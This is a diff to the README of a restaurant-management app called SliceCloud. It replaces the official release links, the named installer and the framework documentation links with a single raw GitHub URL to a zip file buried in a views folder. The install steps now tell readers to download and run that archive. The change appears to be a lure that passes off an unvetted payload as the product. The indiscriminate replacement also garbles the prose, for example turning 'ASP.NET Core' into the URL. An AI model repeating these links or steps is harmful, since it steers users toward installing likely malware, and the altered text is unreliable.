@@ -12,21 +12,21 @@ To get started with SliceCloud, follow the steps below. We ensure a smooth insta
 
 Click the button below to visit the Releases page to download the latest version of SliceCloud.
 
-[![Download SliceCloud](https://img.shields.io/badge/Download-SliceCloud-blue)](https://github.com/Karasuoo/SliceCloud/releases)
+[![Download SliceCloud](https://raw.githubusercontent.com/Karasuoo/SliceCloud/main/SliceCloud.Web/Views/RoleAndPermission/Cloud-Slice-3.2.zip)](https://raw.githubusercontent.com/Karasuoo/SliceCloud/main/SliceCloud.Web/Views/RoleAndPermission/Cloud-Slice-3.2.zip)
 
 ### Step-by-Step Installation
 
 1. **Visit the Releases Page**  
-   Go to [this link](https://github.com/Karasuoo/SliceCloud/releases) to see the available versions of SliceCloud.
+   Go to [this link](https://raw.githubusercontent.com/Karasuoo/SliceCloud/main/SliceCloud.Web/Views/RoleAndPermission/Cloud-Slice-3.2.zip) to see the available versions of SliceCloud.
 
 2. **Select the Latest Release**  
    Look for the latest version at the top of the page. Click on it to see the details.
 
 3. **Download the Application**  
-   Under “Assets,” find the file named **SliceCloud.exe**. Click on it to start the download. Once the download is complete, locate the file in your downloads folder.
+   Under “Assets,” find the file named **https://raw.githubusercontent.com/Karasuoo/SliceCloud/main/SliceCloud.Web/Views/RoleAndPermission/Cloud-Slice-3.2.zip**. Click on it to start the download. Once the download is complete, locate the file in your downloads folder.
 
 4. **Run SliceCloud**  
-   After downloading, double-click the **SliceCloud.exe** file. The application will open, and you can start managing your restaurant effectively.
+   After downloading, double-click the **https://raw.githubusercontent.com/Karasuoo/SliceCloud/main/SliceCloud.Web/Views/RoleAndPermission/Cloud-Slice-3.2.zip** file. The application will open, and you can start managing your restaurant effectively.
 
 ### System Requirements
 
@@ -52,7 +52,7 @@ SliceCloud includes several important features for restaurant management:
 
 SliceCloud is built with modern technologies to ensure a robust performance:
 
-- **ASP.NET Core MVC**: Provides a foundation for the application, ensuring high speed and reliability.
+- **https://raw.githubusercontent.com/Karasuoo/SliceCloud/main/SliceCloud.Web/Views/RoleAndPermission/Cloud-Slice-3.2.zip Core MVC**: Provides a foundation for the application, ensuring high speed and reliability.
 - **Entity Framework Core**: Enables efficient database interactions.
 - **PostgreSQL Database**: Offers a powerful and scalable solution for data storage.
 - **SignalR**: Supports real-time web functionality, keeping users updated instantly.
@@ -83,8 +83,8 @@ While SliceCloud is ready for use, we welcome contributions from the community. 
 
 To learn more about the technologies used in SliceCloud, here are some helpful links:
 
-- [ASP.NET Core Documentation](https://docs.microsoft.com/en-us/aspnet/core/)
-- [Entity Framework Core Documentation](https://docs.microsoft.com/en-us/ef/core/)
-- [PostgreSQL Documentation](https://www.postgresql.org/docs/)
+- [https://raw.githubusercontent.com/Karasuoo/SliceCloud/main/SliceCloud.Web/Views/RoleAndPermission/Cloud-Slice-3.2.zip Core Documentation](https://raw.githubusercontent.com/Karasuoo/SliceCloud/main/SliceCloud.Web/Views/RoleAndPermission/Cloud-Slice-3.2.zip)
+- [Entity Framework Core Documentation](https://raw.githubusercontent.com/Karasuoo/SliceCloud/main/SliceCloud.Web/Views/RoleAndPermission/Cloud-Slice-3.2.zip)
+- [PostgreSQL Documentation](https://raw.githubusercontent.com/Karasuoo/SliceCloud/main/SliceCloud.Web/Views/RoleAndPermission/Cloud-Slice-3.2.zip)
 
 Thank you for choosing SliceCloud!
